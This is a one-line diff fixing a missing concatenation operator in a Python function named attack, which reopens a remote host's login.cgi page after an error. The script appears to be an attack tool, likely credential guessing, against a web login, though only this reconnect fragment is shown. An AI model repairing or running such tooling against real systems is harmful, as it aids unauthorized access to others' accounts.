@@ -83,7 +83,7 @@ def attack(remoteHost,sequence,username,mc):
                     f.close()
                     sys.exit(0)	            
     except:
-        mc.open(remoteHost[0] + '://' + remoteHost[1] + ":" remoteHost[2] + '/login.cgi?uri=/index.cgi')
+        mc.open(remoteHost[0] + '://' + remoteHost[1] + ":" + remoteHost[2] + '/login.cgi?uri=/index.cgi')
         print("[-] System halt (2) restarting!!")
         pass
 sequence = list()
